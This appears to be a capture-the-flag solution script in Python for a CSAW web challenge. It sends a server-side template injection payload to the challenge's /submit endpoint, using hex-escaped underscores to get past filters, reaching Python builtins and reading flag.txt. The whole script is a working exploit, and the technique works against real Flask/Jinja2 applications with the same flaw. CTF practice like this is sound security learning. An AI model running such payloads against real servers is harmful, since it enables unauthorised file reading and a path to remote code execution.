import requests
import sys
host = 'http://web.chal.csaw.io:5000'
endpoint = '/submit'
params = '?value='
try:
    appended="""{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['open']('flag.txt')['read']()}}"""
    r = requests.get(host+endpoint+params+appended)
    if r.status_code != 500 and 'Undefined' not in r.text:
        print('[{}]: {}'.format(r.status_code,r.text))
except:
    pass
